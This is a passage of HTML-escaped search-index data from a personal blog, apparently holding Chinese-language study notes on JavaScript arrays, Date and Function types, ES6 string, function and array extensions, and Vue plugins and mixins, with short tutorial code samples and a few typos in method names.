&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var values = [0, 1, 5, 10, 15]; 
values.sort((a,b)=&amp;gt;{
    return a-b
}); 
alert(values); //0,1,5,10,15 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;操作方法&#34;&gt;操作方法&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;concat()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这个方法会先创建当前数组一个副本，然后将接收到的参数 添加到这个副本的末尾，最后返回新构建的数组。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var colors = [&amp;quot;red&amp;quot;, &amp;quot;green&amp;quot;, &amp;quot;blue&amp;quot;]; 
var colors2 = colors.concat(&amp;quot;yellow&amp;quot;, [&amp;quot;black&amp;quot;, &amp;quot;brown&amp;quot;]); 

alert(colors); //red,green,blue 
alert(colors2); //red,green,blue,yellow,black,brown 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;&lt;code&gt;splice()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;splice()方法始终都会返回一个数组，该数组中包含从原始数组中删除的项&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一参数是开始位置&lt;/li&gt;
&lt;li&gt;第二个参数是删除项&lt;/li&gt;
&lt;li&gt;第三个参数是从开始位置往后插入项&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var colors = [&amp;quot;red&amp;quot;, &amp;quot;green&amp;quot;, &amp;quot;blue&amp;quot;];

colors.splice(1, 1, &amp;quot;red&amp;quot;, &amp;quot;purple&amp;quot;); 

alert(colors); // red,red,purple,blue 

&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;位置方法&#34;&gt;位置方法&lt;/h3&gt;
&lt;h3 id=&#34;indexof-lastindexof&#34;&gt;&lt;code&gt;indexOf() lastIndexOf()&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;indexOf()&lt;/code&gt;查找到第一个符合的返回index，未找到为-1&lt;/p&gt;
&lt;p&gt;&lt;code&gt;lastIndexOf()&lt;/code&gt;查找到最后一个符合的返回index，未找到为-1&lt;/p&gt;
&lt;p&gt;第一个参数为查找对象 第二个参数为开始位置&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;迭代方法&#34;&gt;迭代方法&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;every()：对数组中的每一项运行给定函数，如果该函数对每一项都返回 true，则返回 true。&lt;/li&gt;
&lt;li&gt;filter()：对数组中的每一项运行给定函数，返回该函数会返回 true 的项组成的数组。&lt;/li&gt;
&lt;li&gt;forEach()：对数组中的每一项运行给定函数。这个方法没有返回值&lt;/li&gt;
&lt;li&gt;map()：对数组中的每一项运行给定函数，返回每次函数调用的结果组成的数组。&lt;/li&gt;
&lt;li&gt;some()：对数组中的每一项运行给定函数，如果该函数对任一项返回 true，则返回 true&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;map()&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var numbers = [1,2,3,4,5,4,3,2,1]; 
var mapResult = numbers.map(function(item, index, array){ 
 return item * 2; 
}); 
alert(mapResult); //[2,4,6,8,10,8,6,4,2] 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;归并方法&#34;&gt;归并方法&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;reduce() redunceRight()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;reduce()方法从数组的第一项开始，逐个遍历 到最后。而 reduceRight()则从数组的最后一项开始，向前遍历到第一项。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var values = [1,2,3,4,5]; 
var sum = values.reduce(function(prev, cur, index, array){ 
 return prev + cur; 
}); 
alert(sum); //15 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;date类型&#34;&gt;Date类型&lt;/h2&gt;
&lt;p&gt;创建&lt;/p&gt;
&lt;p&gt;&lt;code&gt;var now = new Date();&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 本地时间 2000 年 1 月 1 日午夜零时
var y2k = new Date(2000, 0); 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;Date.parse()&lt;/code&gt;接收一个表示日期的字符串参数，然后尝试根据这个字符串返回相应日 期的毫秒数&lt;/p&gt;
&lt;p&gt;Date 类型的 toLocaleString()方法会按照与浏览器 设置的地区相适应的格式返回日期和时间&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1627622953316.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;!&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;function&#34;&gt;Function&lt;/h2&gt;
&lt;p&gt;无重载&lt;/p&gt;
&lt;p&gt;一个函数可以作为另一个函数的参数传递&lt;/p&gt;
&lt;p&gt;函数内部属性&lt;code&gt;arguments&lt;/code&gt;  和  &lt;code&gt;this&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;arguments 的主要用途是保存函数参数&lt;/p&gt;
&lt;p&gt;这个对象还有一个名叫 callee 的属性，该属性是一个指针，指向拥有这个 arguments 对象的函数。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;函数内部属性&#34;&gt;函数内部属性&lt;/h3&gt;
&lt;p&gt;这个对象还有一个名叫 callee 的属性，该属性是一个指针，指向拥有这个 arguments 对象的函数。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;window.color = &amp;quot;red&amp;quot;; 
var o = { color: &amp;quot;blue&amp;quot; }; 
function sayColor(){ 
 alert(this.color); 
} 
sayColor(); //&amp;quot;red&amp;quot; 
o.sayColor = sayColor; 
o.sayColor(); //&amp;quot;blue&amp;quot; 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;函数属性和方法&#34;&gt;函数属性和方法&lt;/h3&gt;
&lt;p&gt;每个函数都包含两个 属性：length 和 prototype&lt;/p&gt;
&lt;p&gt;length 属性表示函数希望接收的命名参数的个数&lt;/p&gt;
&lt;p&gt;prototype 属性是不可枚举的，因此使用 for-in 无法发现&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;每个函数都包含两个非继承而来的方法：apply()和 call()。&lt;/p&gt;
&lt;p&gt;apply()方法接收两个参数：一个 是在其中运行函数的作用域，另一个是参数数组&lt;/p&gt;
&lt;p&gt;call()第一个参数是 this 值，其余参数都直接传递给函数&lt;/p&gt;
&lt;p&gt;真正强大的地方是能够扩充函数 赖以运行的作用域&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;window.color = &amp;quot;red&amp;quot;; 
var o = { color: &amp;quot;blue&amp;quot; }; 
function sayColor(){ 
 alert(this.color); 
} 
sayColor(); //red 
sayColor.call(this); //red 
sayColor.call(window); //red 
sayColor.call(o); //blue 
&lt;/code&gt;&lt;/pre&gt;
">JS引用类型</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/es6-kai-pian/"" data-c="
          &lt;p&gt;&lt;code&gt;let&lt;/code&gt; 暂时性死区&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var tmp = 123;

if (true) {
  tmp = &#39;abc&#39;; // ReferenceError
  let tmp;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;const&lt;/code&gt;主要注意数组，对象内部值的改变&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Object.freeze&lt;/code&gt;对象冻结&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;字符串拓展&#34;&gt;字符串拓展&lt;/h2&gt;
&lt;p&gt;模板字符串&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;`Hello ${name}, how are you ${time}?`
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;模板编译&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;let template = `
&amp;lt;ul&amp;gt;
  &amp;lt;% for(let i=0; i &amp;lt; data.supplies.length; i++) { %&amp;gt;
    &amp;lt;li&amp;gt;&amp;lt;%= data.supplies[i] %&amp;gt;&amp;lt;/li&amp;gt;
  &amp;lt;% } %&amp;gt;
&amp;lt;/ul&amp;gt;
`;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使用&lt;code&gt;&amp;lt;%= ... %&amp;gt;&lt;/code&gt;输出 JavaScript 表达式。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;includes&#34;&gt;&lt;code&gt;includes()&lt;/code&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;includes()&lt;/strong&gt;：返回布尔值，表示是否找到了参数字符串。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;startsWith()&lt;/strong&gt;：返回布尔值，表示参数字符串是否在原字符串的头部。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;endsWith()&lt;/strong&gt;：返回布尔值，表示参数字符串是否在原字符串的尾部&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;let s = &#39;Hello world!&#39;;

s.startsWith(&#39;Hello&#39;) // true
s.endsWith(&#39;!&#39;) // true
s.includes(&#39;o&#39;) // true
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这三个方法都支持第二个参数，表示开始搜索的位置。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;repeat&#34;&gt;&lt;code&gt;repeat&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;repeat&lt;/code&gt;方法返回一个新字符串，表示将原字符串重复&lt;code&gt;n&lt;/code&gt;次。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;&#39;x&#39;.repeat(3) // &amp;quot;xxx&amp;quot;
&#39;hello&#39;.repeat(2) // &amp;quot;hellohello&amp;quot;
&#39;na&#39;.repeat(0) // &amp;quot;&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;padstarpadend&#34;&gt;&lt;code&gt;padStar()，padEnd()&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;padStart()&lt;/code&gt;用于头部补全，&lt;code&gt;padEnd()&lt;/code&gt;用于尾部补全。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;&#39;x&#39;.padStart(5, &#39;ab&#39;) // &#39;ababx&#39;
&#39;x&#39;.padStart(4, &#39;ab&#39;) // &#39;abax&#39;

&#39;x&#39;.padEnd(5, &#39;ab&#39;) // &#39;xabab&#39;
&#39;x&#39;.padEnd(4, &#39;ab&#39;) // &#39;xaba&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;trimstarttrimend&#34;&gt;&lt;code&gt;trimStart()，trimEnd()&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;trim()&lt;/code&gt;方法的分解版&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const s = &#39;  abc  &#39;;

s.trim() // &amp;quot;abc&amp;quot;
s.trimStart() // &amp;quot;abc  &amp;quot;
s.trimEnd() // &amp;quot;  abc&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;replaceall&#34;&gt;&lt;code&gt;replaceAll()&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;replace&lt;/code&gt;只替换第一匹配的&lt;/p&gt;
&lt;p&gt;这个替换所以匹配的&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;&#39;aabbcc&#39;.replace(/b/g, &#39;_&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;函数拓展&#34;&gt;函数拓展&lt;/h2&gt;
&lt;p&gt;ES6默认值的加入&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function Point(x = 0, y = 0) {
  this.x = x;
  this.y = y;
  //参数变量是默认声明的，所以不能用let或const再次声明。
  let x = 1; // error
}

const p = new Point();
p // { x: 0, y: 0 }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;解构赋值&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;// 写法一
function m1({x = 0, y = 0} = {}) {
  return [x, y];
}

// 写法二
function m2({x, y} = { x: 0, y: 0 }) {
  return [x, y];
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;区别&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;// 函数没有参数的情况
m1() // [0, 0]
m2() // [0, 0]

// x 和 y 都有值的情况
m1({x: 3, y: 8}) // [3, 8]
m2({x: 3, y: 8}) // [3, 8]

// x 有值，y 无值的情况
m1({x: 3}) // [3, 0]
m2({x: 3}) // [3, undefined]

// x 和 y 都无值的情况
m1({}) // [0, 0];
m2({}) // [undefined, undefined]

m1({z: 3}) // [0, 0]
m2({z: 3}) // [undefined, undefined]
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;rest参数&#34;&gt;rest参数&lt;/h3&gt;
&lt;p&gt;rest 参数代替&lt;code&gt;arguments&lt;/code&gt;变量的例子&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;// arguments变量的写法
function sortNumbers() {
  return Array.prototype.slice.call(arguments).sort();
}

// rest参数的写法
const sortNumbers = (...numbers) =&amp;gt; numbers.sort();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;arguments&lt;/code&gt;对象不是数组，而是一个类似数组的对象。所以为了使用数组的方法，必须使用&lt;code&gt;Array.prototype.slice.call&lt;/code&gt;先将其转为数组.rest 参数就不存在这个问题，它就是一个真正的数组，数组特有的方法都可以使用。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意，rest 参数之后不能再有其他参数&lt;/strong&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;name属性&#34;&gt;name属性&lt;/h3&gt;
&lt;p&gt;函数的&lt;code&gt;name&lt;/code&gt;属性，返回该函数的函数名。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function foo() {}
foo.name // &amp;quot;foo&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;箭头函数&#34;&gt;箭头函数&lt;/h3&gt;
&lt;p&gt;一行代码的情况&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;// 普通函数写法
var result = values.sort(function (a, b) {
  return a - b;
});

// 箭头函数写法
var result = values.sort((a, b) =&amp;gt; a - b);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;注意点&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;（1）箭头函数没有自己的&lt;code&gt;this&lt;/code&gt;对象，内部的&lt;code&gt;this&lt;/code&gt;就是定义时上层作用域中的&lt;code&gt;this&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;（2）不可以当作构造函数，也就是说，不可以对箭头函数使用&lt;code&gt;new&lt;/code&gt;命令，否则会抛出一个错误。&lt;/p&gt;
&lt;p&gt;（3）不可以使用&lt;code&gt;arguments&lt;/code&gt;对象，该对象在函数体内不存在。如果要用，可以用 rest 参数代替。&lt;/p&gt;
&lt;p&gt;（4）不可以使用&lt;code&gt;yield&lt;/code&gt;命令，因此箭头函数不能用作 Generator 函数。&lt;/p&gt;
&lt;br&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function foo() {
  setTimeout(() =&amp;gt; {
    console.log(&#39;id:&#39;, this.id);
  }, 100);
}

var id = 21;

foo.call({ id: 42 });
// id: 42
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;箭头函数导致&lt;code&gt;this&lt;/code&gt;总是指向函数定义生效时所在的对象，所以打印42&lt;/p&gt;
&lt;p&gt;对象的属性建议使用传统的写法定义，不要用箭头函数定义。&lt;/p&gt;
&lt;h3 id=&#34;尾调用-递归&#34;&gt;尾调用 、递归&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function f(x){
  return g(x);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;非尾递归的 Fibonacci 数列实现如下。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function Fibonacci (n) {
  if ( n &amp;lt;= 1 ) {return 1};

  return Fibonacci(n - 1) + Fibonacci(n - 2);
}

Fibonacci(10) // 89
Fibonacci(100) // 超时
Fibonacci(500) // 超时
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;尾递归优化过的 Fibonacci 数列实现如下。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function Fibonacci2 (n , ac1 = 1 , ac2 = 1) {
  if( n &amp;lt;= 1 ) {return ac2};

  return Fibonacci2 (n - 1, ac2, ac1 + ac2);
}

Fibonacci2(100) // 573147844013817200000
Fibonacci2(1000) // 7.0330367711422765e+208
Fibonacci2(10000) // Infinity
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;数组拓展&#34;&gt;数组拓展&lt;/h2&gt;
&lt;p&gt;数组克隆&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const a1 = [1, 2];
// 写法一
const a2 = [...a1];
// 写法二
const [...a2] = a1;
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;数组合并&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const arr1 = [&#39;a&#39;, &#39;b&#39;];
const arr2 = [&#39;c&#39;];
const arr3 = [&#39;d&#39;, &#39;e&#39;];

// ES5 的合并数组
arr1.concat(arr2, arr3);
// [ &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39; ]

// ES6 的合并数组
[...arr1, ...arr2, ...arr3]
// [ &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39; ]
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;arraryfron&#34;&gt;&lt;code&gt;Arrary.fron()&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;类数组的转换&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;let arrayLike = {
    &#39;0&#39;: &#39;a&#39;,
    &#39;1&#39;: &#39;b&#39;,
    &#39;2&#39;: &#39;c&#39;,
    length: 3
};

// ES5的写法
var arr1 = [].slice.call(arrayLike); // [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;]

// ES6的写法
let arr2 = Array.from(arrayLike); // [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;]
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;arrayof&#34;&gt;&lt;code&gt;Array.of()&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;用于将一组值，转换为数组。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;Array.of(3, 11, 8) // [3,11,8]
Array.of(3) // [3]
Array.of(3).length // 1
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;Array() // []
Array(3) // [, , ,]
Array(3, 11, 8) // [3, 11, 8]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;Array()&lt;/code&gt;方法没有参数、一个参数、三个参数时，返回的结果都不一样。只有当参数个数不少于 2 个时，&lt;code&gt;Array()&lt;/code&gt;才会返回由参数组成的新数组。参数只有一个正整数时，实际上是指定数组的长度。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;copywithin&#34;&gt;&lt;code&gt;copyWithin()&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;使用这个方法，会修改当前数组。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;Array.prototype.copyWithin(target, start = 0, end = this.length)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;它接受三个参数。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;target（必需）：从该位置开始替换数据。如果为负值，表示倒数。&lt;/li&gt;
&lt;li&gt;start（可选）：从该位置开始读取数据，默认为 0。如果为负值，表示从末尾开始计算。&lt;/li&gt;
&lt;li&gt;end（可选）：到该位置前停止读取数据，默认等于数组长度。如果为负值，表示从末尾开始计算。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;/ 将3号位复制到0号位
[1, 2, 3, 4, 5].copyWithin(0, 3, 4)
// [4, 2, 3, 4, 5]

// -2相当于3号位，-1相当于4号位
[1, 2, 3, 4, 5].copyWithin(0, -2, -1)
// [4, 2, 3, 4, 5]

// 将3号位复制到0号位
[].copyWithin.call({length: 5, 3: 1}, 0, 3)
// {0: 1, 3: 1, length: 5}

// 将2号位到数组结束，复制到0号位
let i32a = new Int32Array([1, 2, 3, 4, 5]);
i32a.copyWithin(0, 2);
// Int32Array [3, 4, 5, 4, 5]

// 对于没有部署 TypedArray 的 copyWithin 方法的平台
// 需要采用下面的写法
[].copyWithin.call(new Int32Array([1, 2, 3, 4, 5]), 0, 3, 4);
// Int32Array [4, 2, 3, 4, 5]
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;find和findindex&#34;&gt;&lt;code&gt;find()&lt;/code&gt;和&lt;code&gt;findIndex()&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;find&lt;/code&gt;方法，用于找出第一个符合条件的数组成员。如果没有符合条件的成员，则返回&lt;code&gt;undefined&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;[1, 4, -5, 10].find((n) =&amp;gt; n &amp;lt; 0)
// -5
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;findIndex&lt;/code&gt;方法的用法与&lt;code&gt;find&lt;/code&gt;方法非常类似，返回第一个符合条件的数组成员的位置，如果所有成员都不符合条件，则返回&lt;code&gt;-1&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;[1, 5, 10, 15].findIndex(function(value, index, arr) {
  return value &amp;gt; 9;
}) // 2
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;fill&#34;&gt;&lt;code&gt;fill()&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;fill&lt;/code&gt;方法使用给定值，填充一个数组。用于空数组的初始化非常方便。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;[&#39;a&#39;, &#39;b&#39;, &#39;c&#39;].fill(7)
// [7, 7, 7]

new Array(3).fill(7)
// [7, 7, 7]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;fill&lt;/code&gt;方法还可以接受第二个和第三个参数，用于指定填充的起始位置和结束位置。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;[&#39;a&#39;, &#39;b&#39;, &#39;c&#39;].fill(7, 1, 2)
// [&#39;a&#39;, 7, &#39;c&#39;]
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;includes-2&#34;&gt;&lt;code&gt;includes()&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;返回一个布尔值，表示某个数组是否包含给定的值&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;[1, 2, 3].includes(2)     // true
[1, 2, 3].includes(4)     // false
[1, 2, NaN].includes(NaN) // true
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;flag-flagmap&#34;&gt;&lt;code&gt;flag()&lt;/code&gt; 、&lt;code&gt;flagMap()&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;用于将嵌套的数组“拉平”，变成一维的数组。该方法返回一个新数组，对原数据没有影响。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;[1, 2, [3, 4]].flat()
// [1, 2, 3, 4]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;flat()&lt;/code&gt;默认只会“拉平”一层，如果想要“拉平”多层的嵌套数组，可以将&lt;code&gt;flat()&lt;/code&gt;方法的参数写成一个整数，表示想要拉平的层数，默认为1。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;[1, 2, [3, [4, 5]]].flat()
// [1, 2, 3, [4, 5]]

[1, 2, [3, [4, 5]]].flat(2)
// [1, 2, 3, 4, 5]


//如果不管有多少层嵌套，都要转成一维数组，可以用Infinity关键字作为参数。
[1, [2, [3]]].flat(Infinity)
// [1, 2, 3]

//如果原数组有空位，flat()方法会跳过空位。
[1, 2, , 4, 5].flat()
// [1, 2, 4, 5]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;flatMap()&lt;/code&gt;方法对原数组的每个成员执行一个函数&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flatMap()&lt;/code&gt;只能展开一层数组。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;// 相当于 [[[2]], [[4]], [[6]], [[8]]].flat()
[1, 2, 3, 4].flatMap(x =&amp;gt; [[x * 2]])
// [[2], [4], [6], [8]]
&lt;/code&gt;&lt;/pre&gt;
">ES6开篇</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/vue-wen-dang-cha-jian/"" data-c="
          &lt;p&gt;插件通常用来为 Vue 添加全局功能。插件的功能范围没有严格的限制——一般有下面几种：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;添加全局方法或者 property。如：&lt;a href=&#34;https://github.com/karol-f/vue-custom-element&#34;&gt;vue-custom-element&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;添加全局资源：指令/过滤器/过渡等。如 &lt;a href=&#34;https://github.com/vuejs/vue-touch&#34;&gt;vue-touch&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;通过全局混入来添加一些组件选项。如 &lt;a href=&#34;https://github.com/vuejs/vue-router&#34;&gt;vue-router&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;添加 Vue 实例方法，通过把它们添加到 &lt;code&gt;Vue.prototype&lt;/code&gt; 上实现。&lt;/li&gt;
&lt;li&gt;一个库，提供自己的 API，同时提供上面提到的一个或多个功能。如 vue-router&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;Vue.use()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;它需要在你调用 &lt;code&gt;new Vue()&lt;/code&gt; 启动应用之前完成：&lt;/p&gt;
&lt;p&gt;有些组件经常会用这个去注册&lt;/p&gt;
&lt;p&gt;主要因为其中注册的组件都有一个叫 &lt;code&gt;install&lt;/code&gt; 的方法&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Vue.use&lt;/code&gt; 会自动阻止多次注册相同插件&lt;/p&gt;
&lt;p&gt;Vue.use()会默认调用这个方法去注册，同时传一个 Vue 这个类的参数。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 引入组件
import LoadingComponent from &#39;./loading.vue&#39;
// 定义 Loading 对象
const Loading={
    // install 是默认的方法。当外界在 use 这个组件的时候，就会调用本身的 install 方法，同时传一个 Vue 这个类的参数。
    install:function(Vue){
        Vue.component(&#39;Loading&#39;,LoadingComponent)
    }
}
// 导出
export default Loading
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;&lt;code&gt;Vue.mixin()&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;vue中提供了一种混合机制--mixins，用来更高效的实现组件内容的复用。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;组件在引用之后相当于&lt;strong&gt;在父组件内开辟了一块单独的空间&lt;/strong&gt;，来根据父组件props过来的值进行相应的操作，单本质上两者还是&lt;strong&gt;泾渭分明&lt;/strong&gt;，相对独立。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;let mixin={
    data(){
        return{
            msg:1
        }
    },
    methods:{
        foo(){
            console.log(&#39;hello from mixin!----&#39;+this.msg++)
        }
    }
}
var child=Vue.component(&#39;child&#39;,{ 
        template:`&amp;lt;h1 @click=&amp;quot;foo&amp;quot;&amp;gt;child component&amp;lt;/h1&amp;gt;`, 
        mixins:[mixin]
})
Vue.component(&#39;kid&#39;,{ 
        template:`&amp;lt;h1 @click=&amp;quot;foo&amp;quot;&amp;gt;kid component&amp;lt;/h1&amp;gt;`, 
        mixins:[mixin]
})
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;但引入的都是开辟独立空间的一块内存，所以不会共用，类似把有相同的方法和属性共享写出去。&lt;/p&gt;
&lt;h2 id=&#34;方法的覆盖&#34;&gt;方法的覆盖&lt;/h2&gt;
